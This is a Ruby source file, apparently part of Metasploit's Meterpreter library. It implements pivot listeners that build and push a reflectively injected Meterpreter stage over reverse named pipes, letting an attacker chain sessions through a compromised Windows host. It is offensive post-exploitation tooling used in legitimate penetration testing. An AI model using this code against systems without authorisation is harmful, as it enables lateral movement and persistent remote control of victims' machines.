# -*- coding: binary -*-

require 'rex/post/meterpreter/inbound_packet_handler'
require 'securerandom'

module Rex
module Post
module Meterpreter

class PivotListener
  attr_accessor :id

  attr_accessor :session_class

  attr_accessor :url

  attr_accessor :stage

  def initialize(session_class, url, stage)
    self.id = [SecureRandom.uuid.gsub(/-/, '')].pack('H*')
    self.session_class = session_class
    self.url = url
    self.stage = stage
  end

  def to_row
    [self.id.unpack('H*')[0], url, stage]
  end
end

class Pivot

  #
  # The associated meterpreter client instance
  #
  attr_accessor :client

  attr_accessor :pivoted_session

  # Class modifications to support global pivot message
  # dispatching without having to register a per-instance handler
  class << self
    include Rex::Post::Meterpreter::InboundPacketHandler

    # Class request handler for all channels that dispatches requests
    # to the appropriate class instance's DIO handler
    def request_handler(client, packet)
      handled = false
      if packet.method == 'core_pivot_session_new'
        handled = true
        session_guid = packet.get_tlv_value(TLV_TYPE_SESSION_GUID)
        listener_id = packet.get_tlv_value(TLV_TYPE_PIVOT_ID)
        client.add_pivot_session(Pivot.new(client, session_guid, listener_id))
      elsif packet.method == 'core_pivot_session_died'
        handled = true
        session_guid = packet.get_tlv_value(TLV_TYPE_SESSION_GUID)
        pivot = client.find_pivot_session(session_guid)
        if pivot
          pivot.pivoted_session.kill('Died')
          client.remove_pivot_session(session_guid)
        end
      end
      handled
    end
  end

  def Pivot.get_listeners(client)
    client.pivot_listeners
  end

  def Pivot.remove_listener(client, listener_id)
    if client.find_pivot_listener(listener_id)
      request = Packet.create_request('core_pivot_remove')
      request.add_tlv(TLV_TYPE_PIVOT_ID, listener_id)
      client.send_request(request)
      client.remove_pivot_listener(listener_id)
    end
  end

  def Pivot.create_named_pipe_listener(client, opts={})
    request = Packet.create_request('core_pivot_add')
    request.add_tlv(TLV_TYPE_PIVOT_NAMED_PIPE_NAME, opts[:pipe_name])

    # TODO: use the framework to generate the whole lot, including a session type
    c = Class.new(::Msf::Payload)
    c.include(::Msf::Payload::Stager)
    c.include(::Msf::Payload::TransportConfig)

    # TODO: add more platforms
    case opts[:platform]
    when 'windows'
      # Include the appropriate reflective dll injection module for the target process architecture...
      if opts[:arch] == ARCH_X86
        c.include(::Msf::Payload::Windows::MeterpreterLoader)
      elsif opts[:arch] == ARCH_X64
        c.include(::Msf::Payload::Windows::MeterpreterLoader_x64)
      else
        STDERR.puts("Not including a loader for '#{opts[:arch]}'\n")
      end
    end

    stage_opts = {
      arch: opts[:arch],
      force_write_handle: true,
      null_session_guid: true,
      datastore: {
        exit_func: opts[:exit_func] || 'process',
        expiration: client.expiration,
        comm_timeout: client.comm_timeout,
        retry_total: client.retry_total,
        retry_wait: client.retry_wait,
        'PIPEHOST' => opts[:pipe_host],
        'PIPENAME' => opts[:pipe_name]
      }
    }

    # Create the migrate stager
    stager = c.new()

    stage_opts[:transport_config] = [stager.transport_config_reverse_named_pipe(stage_opts)]
    stage = stager.stage_payload(stage_opts)

    url = "pipe://#{opts[:pipe_host]}/#{opts[:pipe_name]}"
    stage_config = "#{opts[:arch]}/#{opts[:platform]}"
    pivot_listener = PivotListener.new(::Msf::Sessions::Meterpreter_x86_Win, url, stage_config)

    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA, stage)
    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA_SIZE, stage.length)
    request.add_tlv(TLV_TYPE_PIVOT_ID, pivot_listener.id)

    client.send_request(request)

    client.add_pivot_listener(pivot_listener)

    pivot_listener
  end

  def initialize(client, session_guid, listener_id)
    self.client = client

    opts = {
      pivot_session: client,
      session_guid:  session_guid
    }

    listener = client.find_pivot_listener(listener_id)
    self.pivoted_session = listener.session_class.new(nil, opts)

    self.pivoted_session.framework = self.client.framework
    self.pivoted_session.bootstrap({'AutoVerifySessionTimeout' => 30})
    self.client.framework.sessions.register(self.pivoted_session)
  end

protected

  #
  # Cleans up any lingering resources
  #
  def cleanup
  end

end

end; end; end


